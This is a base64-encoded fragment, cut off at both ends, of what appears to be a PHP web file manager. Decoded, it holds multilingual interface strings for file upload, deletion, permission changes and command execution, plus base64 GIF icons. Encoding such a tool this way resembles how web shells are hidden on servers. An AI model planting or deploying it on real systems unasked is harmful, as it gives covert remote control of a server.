aWVyb24gc2VyIG1vdmlkb3MgYSBcIlslMl1cIjpcDQpbJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnQ29waWFyIGVzdG9zIGFyY2hpdm9zOicsDQonY29waWVkJyA9PiAiRXN0b3MgYXJjaGl2b3MgaGFuIHNpZG8gY29waWFkb3MgYSAgXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIkVzdG9zIGFyY2hpdm9zIG5vIHB1ZGllcm9uIHNlciBjb3BpYWRvcyBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfZWRpdGVkJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIGVkaXRhZG8uJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGhhIHNpZG8gZWplY3V0YWRvIGNvcnJlY3RhbWVudGU6XA0KeyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgbm8gcHVkbyBzZXIgZWplY3V0YWRvIGNvcnJlY3RhbWVudGU6XA0KeyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgaGEgc2lkbyBzYWx2YWRvLicsDQonbm90X3NhdmVkJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIHNhbHZhZG8uJywNCidzeW1saW5rZWQnID0+ICdFbmxhY2UgZGVzZGUgIlslMl0iIGEgIlslMV0iIGhhIHNpZG8gY3JlYWRvLicsDQonbm90X3N5bWxpbmtlZCcgPT4gJ0VubGFjZSBkZXNkZSAiWyUyXSIgYSAiWyUxXSIgbm8gcHVkbyBzZXIgY3JlYWRvLicsDQoncGVybWlzc2lvbl9mb3InID0+ICdQZXJtaXNvcyBkZSAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ1Blcm1pc29zIGRlICJbJTFdIiBmdWVyb24gc2V0ZWFkb3MgYSBbJTJdLicsDQoncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnUGVybWlzb3MgZGUgIlslMV0iIG5vIHB1ZG8gc2VyIHNldGVhZG8gYSBbJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIG5vIHB1ZG8gc2VyIGxlP2RvLicNCgkJKTsNCg0KCWNhc2UgJ2RrJzoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnbi9qL3kgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdNYXBwZScsDQonZmlsZScgPT4gJ0ZpbCcsDQonZmlsZW5hbWUnID0+ICdGaWxuYXZuJywNCg0KJ3NpemUnID0+ICdTdD9ycmVsc2UnLA0KJ3Blcm1pc3Npb24nID0+ICdSZXR0aWdoZWQnLA0KJ293bmVyJyA9PiAnRWplcicsDQonZ3JvdXAnID0+ICdHcnVwcGUnLA0KJ290aGVyJyA9PiAnQW5kcmUnLA0KJ2Z1bmN0aW9ucycgPT4gJ0Z1bmt0aW9uZXInLA0KDQoncmVhZCcgPT4gJ2w/cycsDQond3JpdGUnID0+ICdza3JpdicsDQonZXhlY3V0ZScgPT4gJ2s/cicsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ29wcmV0IHN5bWJvbHNrIGxpbmsnLA0KJ2RlbGV0ZScgPT4gJ3NsZXQnLA0KJ3JlbmFtZScgPT4gJ29tZD9iJywNCidtb3ZlJyA9PiAnZmx5dCcsDQonY29weScgPT4gJ2tvcGllcicsDQonZWRpdCcgPT4gJ3JlZGlnZXInLA0KJ2Rvd25sb2FkJyA9PiAnZG93bmxvYWQnLA0KJ3VwbG9hZCcgPT4gJ3VwbG9hZCcsDQonY3JlYXRlJyA9PiAnb3ByZXQnLA0KJ2NoYW5nZScgPT4gJ3NraWZ0JywNCidzYXZlJyA9PiAnZ2VtJywNCidzZXQnID0+ICdzP3QnLA0KJ3Jlc2V0JyA9PiAnbnVsc3RpbCcsDQoncmVsYXRpdmUnID0+ICdSZWxhdGl2IHN0aSB0aWwgdmFsZycsDQoNCid5ZXMnID0+ICdKYScsDQonbm8nID0+ICdOZWonLA0KJ2JhY2snID0+ICd0aWxiYWdlJywNCidkZXN0aW5hdGlvbicgPT4gJ0Rpc3RpbmF0aW9uJywNCidzeW1saW5rJyA9PiAnU3ltYm9sc2sgbGluaycsDQonbm9fb3V0cHV0JyA9PiAnaW5nZW4gcmVzdWx0YXQnLA0KDQondXNlcicgPT4gJ0JydWdlcicsDQoncGFzc3dvcmQnID0+ICdLb2Rlb3JkJywNCidhZGQnID0+ICd0aWxmP2onLA0KJ2FkZF9iYXNpY19hdXRoJyA9PiAndGlsZj9qIGdydW5kbGlnZ2VuZGUgcmV0dGlnaGVkZXInLA0KDQondXBsb2FkZWQnID0+ICciWyUxXSIgZXIgYmxldmV0IHVwbG9hZGVkLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIGt1bm51IGlra2UgdXBsb2FkZXMuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBmaW5kZXMgYWxsZXJlZGUuJywNCidjcmVhdGVkJyA9PiAnIlslMV0iIGVyIGJsZXZldCBvcHJldHRldC4nLA0KJ25vdF9jcmVhdGVkJyA9PiAnIlslMV0iIGt1bm5lIGlra2Ugb3ByZXR0ZXMuJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnU2xldCBkaXNzZSBmaWxlcj8nLA0KJ2RlbGV0ZWQnID0+ICJEaXNzZSBmaWxlciBlciBibGV2ZXQgc2xldHRldDpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkRpc3NlIGZpbGVyIGt1bm5lIGlra2Ugc2xldHRlczpcDQpbJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ09tZD9kIGZpbDonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgZXIgYmxldmV0IG9tZD9idCB0aWwgIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBrdW5uZSBpa2tlIG9tZD9iZXMgdGlsICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdGbHl0IGRpc3NlIGZpbGVyOicsDQonbW92ZWQnID0+ICJEaXNzZSBmaWxlciBlciBibGV2ZXQgZmx5dHRldCB0aWwgXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X21vdmVkJyA9PiAiRGlzc2UgZmlsZXIga3VubmUgaWtrZSBmbHl0dGVzIHRpbCBcIlslMl1cIjpcDQpbJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnS29waWVyIGRpc3NlIGZpbGVyOicsDQonY29waWVkJyA9PiAiRGlzc2UgZmlsZXIgZXIga29waWVyZXQgdGlsIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJEaXNzZSBmaWxlciBrdW5uZSBpa2tlIGtvcGllcmVzIHRpbCBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfZWRpdGVkJyA9PiAnIlslMV0iIGthbiBpa2tlIHJlZGlnZXJlcy4nLA0KJ2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgZXIgYmxldmV0IGs/cnQga29ycmVrdDpcDQp7JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBrYW4gaWtrZSBrP3JlcyBrb3JyZWt0OlwNCnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iIGVyIGJsZXZldCBnZW10LicsDQonbm90X3NhdmVkJyA9PiAnIlslMV0iIGt1bm5lIGlra2UgZ2VtbWVzLicsDQonc3ltbGlua2VkJyA9PiAnU3ltYm9sc2sgbGluayBmcmEgIlslMl0iIHRpbCAiWyUxXSIgZXIgYmxldmV0IG9wcmV0dGV0LicsDQonbm90X3N5bWxpbmtlZCcgPT4gJ1N5bWJvbHNrIGxpbmsgZnJhICJbJTJdIiB0aWwgIlslMV0iIGt1bm5lIGlra2Ugb3ByZXR0ZXMuJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ1JldHRpZ2hlZGVyIGZvciAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ1JldHRpZ2hlZGVyIGZvciAiWyUxXSIgYmxldiBzYXQgdGlsIFslMl0uJywNCidwZXJtaXNzaW9uX25vdF9zZXQnID0+ICdSZXR0aWdoZWRlciBmb3IgIlslMV0iIGt1bm5lIGlra2Ugcz90dGVzIHRpbCBbJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIEthbiBpa2tlIGw/c2VzLicNCgkJKTsNCg0KCWNhc2UgJ3RyJzoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnbi9qL3kgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdLbGFzP3InLA0KJ2ZpbGUnID0+ICdEb3N5YScsDQonZmlsZW5hbWUnID0+ICdkb3N5YSBhZGknLA0KDQonc2l6ZScgPT4gJ2JveXV0dScsDQoncGVybWlzc2lvbicgPT4gJ0l6aW4nLA0KJ293bmVyJyA9PiAnc2FoaWInLA0KJ2dyb3VwJyA9PiAnR3J1cCcsDQonb3RoZXInID0+ICdEaWdlcmxlcmknLA0KJ2Z1bmN0aW9ucycgPT4gJ0ZvbmtzaXlvbmxhcicsDQoNCidyZWFkJyA9PiAnb2t1JywNCid3cml0ZScgPT4gJ3lheicsDQonZXhlY3V0ZScgPT4gJz9hbGlzdGlyJywNCidjcmVhdGVfc3ltbGluaycgPT4gJ3lhcmF0IHN5bWxpbmsnLA0KJ2RlbGV0ZScgPT4gJ3NpbCcsDQoncmVuYW1lJyA9PiAnYWQgZGVnaXN0aXInLA0KJ21vdmUnID0+ICd0YXNpJywNCidjb3B5JyA9PiAna29weWFsYScsDQonZWRpdCcgPT4gJ2Q/emVubGUnLA0KJ2Rvd25sb2FkJyA9PiAnaW5kaXInLA0KJ3VwbG9hZCcgPT4gJ3k/a2xlJywNCidjcmVhdGUnID0+ICdjcmVhdGUnLA0KJ2NoYW5nZScgPT4gJ2RlZ2lzdGlyJywNCidzYXZlJyA9PiAna2F5ZGV0JywNCidzZXQnID0+ICdheWFyJywNCidyZXNldCcgPT4gJ3NpZmlybGEnLA0KJ3JlbGF0aXZlJyA9PiAnSGVkZWYgeW9sYSBnP3JlJywNCid5ZXMnID0+ICdFdmV0JywNCidubycgPT4gJ2dzaCcsDQonYmFjaycgPT4gJ0dlcmknLA0KJ2Rlc3RpbmF0aW9uJyA9PiAnSGVkZWYnLA0KJ3N5bWxpbmsnID0+ICdLP3NhIHlvbCcsDQonbm9fb3V0cHV0JyA9PiAnP2lrdGkgeW9rJywNCid1c2VyJyA9PiAnS3VsbGFuaWNpJywNCidwYXNzd29yZCcgPT4gJ1NpZnJlJywNCidhZGQnID0+ICdla2xlJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2VrbGUgYmFzaXQtYXV0aGVudGlmaWNhdGlvbicsDQondXBsb2FkZWQnID0+ICciWyUxXSIgeT9rbGVuZGkuJywNCidub3RfdXBsb2FkZWQnID0+ICciWyUxXSIgeT9rbGVuZW1lZGkuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBrdWxsYW5pbG1ha3RhLicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiBvbHVzdHVydWxkdS4nLA0KJ25vdF9jcmVhdGVkJyA9PiAnIlslMV0iIG9sdXN0dXJ1bGFtYWRpLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ0J1IGRvc3lhbGFyaSBzaWxtZWsgaXN0ZWRpZ2luaXpkZW4gZW1pbm1pc2luaXo/JywNCidkZWxldGVkJyA9PiAiQnUgZG9zeWFsYXIgc2lsaW5kaTpcDQpbJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkJ1IGRvc3lhbGFyIHNpbGluZW1lZGk6XA0KWyUxXSIsDQoncmVuYW1lX2ZpbGUnID0+ICdBZGkgZGVnaXNlbiBkb3N5YTonLA0KJ3JlbmFtZWQnID0+ICciWyUxXSIgYWRpbGkgZG9zeWFuaW4geWVuaSBhZGkgIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBhZGkgZGVnaXN0aXJpbGVtZWRpICJbJTJdIiBpbGUuJywNCidtb3ZlX2ZpbGVzJyA9PiAnVGFzaW5hbiBkb3N5YWxhcjonLA0KJ21vdmVkJyA9PiAiQnUgZG9zeWFsYXJpIHRhc2lkaWdpbml6IHllciBcIlslMl1cIjpcDQpbJTFdIiwNCidub3RfbW92ZWQnID0+ICJCdSBkb3N5YWxhcmkgdGFzaXlhbWFkaWdpbml6IHllciBcIlslMl1cIjpcDQpbJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnS29weWFsYW5hbiBkb3N5YWxhcjonLA0KJ2NvcGllZCcgPT4gIkJ1IGRvc3lhbGFyIGtvcHlhbGFuZGkgXCJbJTJdXCI6XA0KWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIkJ1IGRvc3lhbGFyIGtvcHlhbGFuYW1peW9yIFwiWyUyXVwiOlwNClslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIgZD96ZW5sZW5lbWl5b3IuJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGJhc2FyaXlsYSA/YWxpc3RpcmlsZGk6XA0KeyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgP2FsaXN0aXJpbGFtYWRpOlwNCnslMn0iLA0KJ3NhdmVkJyA9PiAnIlslMV0iIGtheWRlZGlsZGkuJywNCidub3Rfc2F2ZWQnID0+ICciWyUxXSIga2F5ZGVkaWxlbWVkaS4nLA0KJ3N5bWxpbmtlZCcgPT4gJyJbJTJdIiBkZW4gIlslMV0iIGUgaz9zYXlvbCBvbHU/dHVydWxkdS4nLA0KJ25vdF9zeW1saW5rZWQnID0+ICciWyUyXSJkZW4gIlslMV0iIGUgaz9zYXlvbCBvbHU/dHVydWxhbWFkPy4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnSXppbmxlciAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ0l6aW5sZXIgIlslMV0iIGRlZ2lzdGlyaWxkaSBbJTJdLicsDQoncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnSXppbmxlciAiWyUxXSIgZGVnaXN0aXJpbGVtZWRpIFslMl0uJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIgb2t1bmFtaXlvci4nDQoJCSk7DQoJY2FzZSAnY3MnOg0KCQkkZGF0ZV9mb3JtYXQgPSAnZC5tLnkgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ1VURi04JzsNCnJldHVybiBhcnJheSgnZGlyZWN0b3J5JyA9PiAnQWRyZXM/Pz8/JywgJ2ZpbGUnID0+ICdTb3Vib3InLCAnZmlsZW5hbWUnID0+ICdKbT8/bm8gc291Ym9ydScsICdzaXplJyA9PiAnVmVsaWtvc3QnLCAncGVybWlzc2lvbicgPT4gJ1ByPz92YScsICdvd25lcicgPT4gJ1ZsYXN0bj8/aycsDQonZ3JvdXAnID0+ICdTa3VwaW5hJywgJ290aGVyJyA9PiAnT3N0YXRuPz8nLA0KJ2Z1bmN0aW9ucycgPT4gJ0Z1bmtjZScsICdyZWFkJyA9PiAnPz90ZW4/PycsICd3cml0ZScgPT4gJ1o/P3BpcycsDQonZXhlY3V0ZScgPT4gJ1Nwb3U/P3Q/P24/PycsICdjcmVhdGVfc3ltbGluaycgPT4gJ1Z5dHZvPz9pdCBzeW1ib2xpY2s/PyBvZGtheicsICdkZWxldGUnID0+ICdTbWF6YXQnLCAncmVuYW1lJyA9PiAnUD8/ZWptZW5vdmF0JywgJ21vdmUnID0+ICdQPz9lc3Vub3V0JywgJ2NvcHknID0+ICdaa29wPz9yb3ZhdCcsICdlZGl0JyA9PiAnT3Rldj8/Pz90JywNCidkb3dubG9hZCcgPT4gJ1N0Pz9obm91dCcsICd1cGxvYWQnID0+ICdOYWhyYWogbmEgc2VydmVyJywgJ2NyZWF0ZScgPT4gJ1Z5dHZvPz9pdCcsICdjaGFuZ2UnID0+ICdabT8/bml0JywgJ3NhdmUnID0+ICdVbG8/P2l0JywgJ3NldCcgPT4gJ05hc3Rhdml0JywgJ3Jlc2V0JyA9PiAnenA/P3QnLCAncmVsYXRpdmUnID0+ICdSZWxhdGlmJywNCid5ZXMnID0+ICdBbm8nLCAnbm8nID0+ICdOZScsDQonYmFjaycgPT4gJ1pwPz90JywgJ2Rlc3RpbmF0aW9uJyA9PiAnRGVzdGluYXRpb24nLCAnc3ltbGluaycgPT4gJ1N5bWJvbGljaz8/IG9ka2F6JywgJ25vX291dHB1dCcgPT4gJ1ByPz96ZG4/PyB2Pz9zdHVwJywgJ3VzZXInID0+ICdVPz9pdmF0ZWwnLCAncGFzc3dvcmQnID0+ICdIZXNsbycsICdhZGQnID0+ICdQPz9pZGF0JywgJ2FkZF9iYXNpY19hdXRoJyA9PiAncD8/aWRlaiB6Pz9rbGFkbj8/IGF1dGVudGl6YWNpJywgJ3VwbG9hZGVkJyA9PiAnU291Ym9yICJbJTFdIiBieWwgbmFocj8/biBuYSBzZXJ2ZXIuJywgJ25vdF91cGxvYWRlZCcgPT4gJ1NvdWJvciAiWyUxXSIgbmVieWwgbmFocj8/biBuYSBzZXJ2ZXIuJywgJ2FscmVhZHlfZXhpc3RzJyA9PiAnU291Ym9yICJbJTFdIiB1Pz8gZXhpdHVqZS4nLCAnY3JlYXRlZCcgPT4gJ1NvdWJvciAiWyUxXSIgYnlsIHZ5dHZvPz9lbi4nLCAnbm90X2NyZWF0ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz90ICB2eXR2bz8/ZW4uJywgJ3JlYWxseV9kZWxldGUnID0+ICdWeW1hemF0IHNvdWJvcj8nLCAnZGVsZXRlZCcgPT4gIkJ5bHkgdnltYXo/P255IHR5dG8gc291Ym9yeTpcIFslMV0iLCAnbm90X2RlbGV0ZWQnID0+ICJUeXRvIHNvdWJvcnkgbmVtb2hseSBiPz90IHZ5dHZvPz9lbnk6XCBbJTFdIiwNCidyZW5hbWVfZmlsZScgPT4gJ1A/P2VqbWVudWogc291Ym9yeTonLA0KJ3JlbmFtZWQnID0+ICdTb3Vib3IgIlslMV0iIGJ5bCBwPz9lam1lbm92Pz9uIG5hICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnU291Ym9yICJbJTFdIiBuZW1vaGwgYj8/dCBwPz9lam1lbm92Pz9uIG5hICJbJTJdIi4nLA0KJ21vdmVfZmlsZXMnID0+ICdQPz9lbT8/c3RpdCB0eXRvIHNvdWJvcnk6JywgJ21vdmVkJyA9PiAiVHl0byBzb3Vib3J5IGJ5bHkgcD8/ZW0/P3N0Pz9ueSBkbyBcIlslMl1cIjpcIFslMV0iLCAnbm90X21vdmVkJyA9PiAiVHl0byBzb3Vib3J5IG5lbW9obHkgYj8/dCBwPz9lbT8/c3Q/P255IGRvIFwiWyUyXVwiOlwgWyUxXSIsICdjb3B5X2ZpbGVzJyA9PiAnWmtvcD8/cm92YXQgdHl0byBzb3Vib3J5OicsICdjb3BpZWQnID0+ICJUeXRvIHNvdWJvcnkgYnlseSB6a29wPz9yb3Y/P255IGRvIFwiWyUyXVwiOlwNClslMV0iLCAnbm90X2NvcGllZCcgPT4gIlR5dG8gc291Ym9yeSBuZW1vaGx5IGI/P3QgemtvcD8/cm92Pz9ueSBkbyBcIlslMl1cIjpcDQpbJTFdIiwgJ25vdF9lZGl0ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz90IG90ZXY/P2VuLicsDQonZXhlY3V0ZWQnID0+ICJTT3Vib3IgXCJbJTFdXCIgYnlsIHNwdT8/dD8/biA6XCB7JTJ9IiwgJ25vdF9leGVjdXRlZCcgPT4gIlNvdWJvciBcIlslMV1cIiBuZW1vaGwgYj8/dCBzcHU/P3Q/P246XCB7JTJ9IiwNCidzYXZlZCcgPT4gJ1NvdWJvciAiWyUxXSIgYnlsIHVsbz8/ZW4uJywNCidub3Rfc2F2ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz90IHVsbz8/ZW4uJywNCidzeW1saW5rZWQnID0+ICdCeWwgdnl2bz8/ZW4gc3ltYm9saWNrPz8gb2RrYXogIlslMl0iIG5hIHNvdWJvciAiWyUxXSIuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnU3ltYm9saWNrPz8gb2RrYXogIlslMl0iIG5hIHNvdWJvciAiWyUxXSIgbmVtb2hsIGI/P3Qgdnl0dm8/P2VuLicsDQoncGVybWlzc2lvbl9mb3InID0+ICdQcj8/dmEgayAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJ1ByPz92YSBrICJbJTFdIiBieWxhIHptPz9uPz9uYSBuYSBbJTJdLicsDQoncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnUHI/P3ZhIGsgIlslMV0iIG5lbW9obGEgYj8/dCB6bT8/bj8/bmEgbmEgWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJ1NvdWJvciAiWyUxXSIgbmVuPz8gbW8/P25vIHA/P2U/Pz8/c3QuJyApOw0KCWNhc2UgJ2VuJzoNCglkZWZhdWx0Og0KCQkkZGF0ZV9mb3JtYXQgPSAnbi9qL3kgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KcmV0dXJuIGFycmF5KCAnZGlyZWN0b3J5JyA9PiAnRGlyZWN0b3J5JywgJ2ZpbGUnID0+ICdGaWxlJywgJ2ZpbGVuYW1lJyA9PiAnRmlsZW5hbWUnLCAnc2l6ZScgPT4gJ1NpemUnLCAncGVybWlzc2lvbicgPT4gJ1Blcm1pc3Npb24nLCAnb3duZXInID0+ICdPd25lcicsICdncm91cCcgPT4gJ0dyb3VwJywgJ290aGVyJyA9PiAnT3RoZXJzJywNCidmdW5jdGlvbnMnID0+ICdGdW5jdGlvbnMnLCAncmVhZCcgPT4gJ3JlYWQnLCAnd3JpdGUnID0+ICd3cml0ZScsICdleGVjdXRlJyA9PiAnZXhlY3V0ZScsICdjcmVhdGVfc3ltbGluaycgPT4gJ2NyZWF0ZSBzeW1saW5rJywgJ2RlbGV0ZScgPT4gJ2RlbGV0ZScsDQoncmVuYW1lJyA9PiAncmVuYW1lJywgJ21vdmUnID0+ICdtb3ZlJywgJ2NvcHknID0+ICdjb3B5JywgJ2VkaXQnID0+ICdlZGl0JywgJ2Rvd25sb2FkJyA9PiAnZG93bmxvYWQnLCAndXBsb2FkJyA9PiAndXBsb2FkJywNCidjcmVhdGUnID0+ICdjcmVhdGUnLCAnY2hhbmdlJyA9PiAnY2hhbmdlJywgJ3NhdmUnID0+ICdzYXZlJywgJ3NldCcgPT4gJ3NldCcsICdyZXNldCcgPT4gJ3Jlc2V0JywNCidyZWxhdGl2ZScgPT4gJ1JlbGF0aXZlIHBhdGggdG8gdGFyZ2V0JywgJ3llcycgPT4gJ1llcycsICdubycgPT4gJ05vJywgJ2JhY2snID0+ICdiYWNrJywgJ2Rlc3RpbmF0aW9uJyA9PiAnRGVzdGluYXRpb24nLCAnc3ltbGluaycgPT4gJ1N5bWxpbmsnLCAnbm9fb3V0cHV0JyA9PiAnbm8gb3V0cHV0JywgJ3VzZXInID0+ICdVc2VyJywgJ3Bhc3N3b3JkJyA9PiAnUGFzc3dvcmQnLCAnYWRkJyA9PiAnYWRkJywgJ2FkZF9iYXNpY19hdXRoJyA9PiAnYWRkIGJhc2ljLWF1dGhlbnRpZmljYXRpb24nLCAndXBsb2FkZWQnID0+ICciWyUxXSIgaGFzIGJlZW4gdXBsb2FkZWQuJywNCidub3RfdXBsb2FkZWQnID0+ICciWyUxXSIgY291bGQgbm90IGJlIHVwbG9hZGVkLicsICdhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBhbHJlYWR5IGV4aXN0cy4nLA0KJ2NyZWF0ZWQnID0+ICciWyUxXSIgaGFzIGJlZW4gY3JlYXRlZC4nLCAnbm90X2NyZWF0ZWQnID0+ICciWyUxXSIgY291bGQgbm90IGJlIGNyZWF0ZWQuJywgJ3JlYWxseV9kZWxldGUnID0+ICdEZWxldGUgdGhlc2UgZmlsZXM/JywgJ2RlbGV0ZWQnID0+ICJUaGVzZSBmaWxlcyBoYXZlIGJlZW4gZGVsZXRlZDpcIFslMV0iLCAnbm90X2RlbGV0ZWQnID0+ICJUaGVzZSBmaWxlcyBjb3VsZCBub3QgYmUgZGVsZXRlZDpcIFslMV0iLCdyZW5hbWVfZmlsZScgPT4gJ1JlbmFtZSBmaWxlOicsICdyZW5hbWVkJyA9PiAnIlslMV0iIGhhcyBiZWVuIHJlbmFtZWQgdG8gIlslMl0iLicsICdub3RfcmVuYW1lZCcgPT4gJyJbJTFdIGNvdWxkIG5vdCBiZSByZW5hbWVkIHRvICJbJTJdIi4nLCAnbW92ZV9maWxlcycgPT4gJ01vdmUgdGhlc2UgZmlsZXM6JywgJ21vdmVkJyA9PiAiVGhlc2UgZmlsZXMgaGF2ZSBiZWVuIG1vdmVkIHRvIFwiWyUyXVwiOlwgWyUxXSIsDQonbm90X21vdmVkJyA9PiAiVGhlc2UgZmlsZXMgY291bGQgbm90IGJlIG1vdmVkIHRvIFwiWyUyXVwiOlwgWyUxXSIsICdjb3B5X2ZpbGVzJyA9PiAnQ29weSB0aGVzZSBmaWxlczonLCAnY29waWVkJyA9PiAiVGhlc2UgZmlsZXMgaGF2ZSBiZWVuIGNvcGllZCB0byBcIlslMl1cIjpcDQpbJTFdIiwgJ25vdF9jb3BpZWQnID0+ICJUaGVzZSBmaWxlcyBjb3VsZCBub3QgYmUgY29waWVkIHRvIFwiWyUyXVwiOlwgWyUxXSIsICdub3RfZWRpdGVkJyA9PiAnIlslMV0iIGNhbiBub3QgYmUgZWRpdGVkLicsICdleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGhhcyBiZWVuIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseTpcIHslMn0iLCAnbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgY291bGQgbm90IGJlIGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseTpcIHslMn0iLCAnc2F2ZWQnID0+ICciWyUxXSIgaGFzIGJlZW4gc2F2ZWQuJywNCidub3Rfc2F2ZWQnID0+ICciWyUxXSIgY291bGQgbm90IGJlIHNhdmVkLicsICdzeW1saW5rZWQnID0+ICdTeW1saW5rIGZyb20gIlslMl0iIHRvICJbJTFdIiBoYXMgYmVlbiBjcmVhdGVkLicsICdub3Rfc3ltbGlua2VkJyA9PiAnU3ltbGluayBmcm9tICJbJTJdIiB0byAiWyUxXSIgY291bGQgbm90IGJlIGNyZWF0ZWQuJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ1Blcm1pc3Npb24gb2YgIlslMV0iOicsICdwZXJtaXNzaW9uX3NldCcgPT4gJ1Blcm1pc3Npb24gb2YgIlslMV0iIHdhcyBzZXQgdG8gWyUyXS4nLCAncGVybWlzc2lvbl9ub3Rfc2V0JyA9PiAnUGVybWlzc2lvbiBvZiAiWyUxXSIgY291bGQgbm90IGJlIHNldCB0byBbJTJdLicsICdub3RfcmVhZGFibGUnID0+ICciWyUxXSIgY2FuIG5vdCBiZSByZWFkLicgKTsNCgl9DQp9DQpmdW5jdGlvbiBnZXRpbWFnZSAoJGltYWdlKSB7DQoJc3dpdGNoICgkaW1hZ2UpIHsNCgljYXNlICdmaWxlJzoNCgkJcmV0dXJuIGJhc2U2NF9kZWNvZGUoJ1IwbEdPRGxoRVFBTkFKRURBSm1abWYvLy93QUFBUC8vL3lINUJBSG9Bd01BTEFBQUFBQVJBQTBBQUFJdG5JR0p4ZzBCNDJyc2lTdkNBL1JFbVhRV2htbmloM0xVU0dhcWczNXZGYlNYdWNiU2FidW5qbk1vaHE4Q0FEc0EnKTsNCgljYXNlICdmb2xkZXInOg0KCQlyZXR1cm4gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhFUUFOQUpFREFKbVptZi8vLzh6TXpQLy8veUg1QkFIb0F3TUFMQUFBQUFBUkFBMEFBQUlxbkkrWndLd2JZZ1RQdEl1ZGxid0xPZ0NCUUpZbUNZcm4rbTNzbVk1dkdjKzBhN2Roamg3WmJ5Z0FBRHNBJyk7DQoJY2FzZSAnaGlkZGVuX2ZpbGUnOg0KCQlyZXR1cm4gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhFUUFOQUpFREFNd0FBUC8vLzVtWm1mLy8veUg1QkFIb0F3TUFMQUFBQUFBUkFBMEFBQUl0bklHSnhnMEI0MnJzaVN2Q0EvUkVtWFFXaG1uaWgzTFVTR2FxZzM1dkZiU1h1Y2JTYWJ1bmpuTW9ocThDQURzQScpOw0KCWNhc2UgJ2xpbmsnOg0KCQlyZXR1cm4gYmFzZTY0X2RlY29kZSgnUjBsR09EbGhFUUFOQUtJRUFKbVptZi8vL3dBQUFNd0FBUC8vL3dBQUFBQUFBQUFBQUNINUJBSG9Bd1FBTEFBQUFBQVJBQTBBQUFNNVNBcmNyRENDUU91TGNJb3R3Z1RZVWxsTk9BMER4WGttaFk0c2hNNXpzTVVLVFk4Z05nVXZXNmNuQWFaZ3hNeUlNMnpCTENhSGxKZ0FBRHNBJyk7DQoJY2FzZSAnc21pbGV5JzoNCgkJcmV0dXJuIGJhc2U2NF9kZWNvZGUoJ1IwbEdPRGxoRVFBTkFKRUNBQUFBQVAvL0FQLy8vd0FB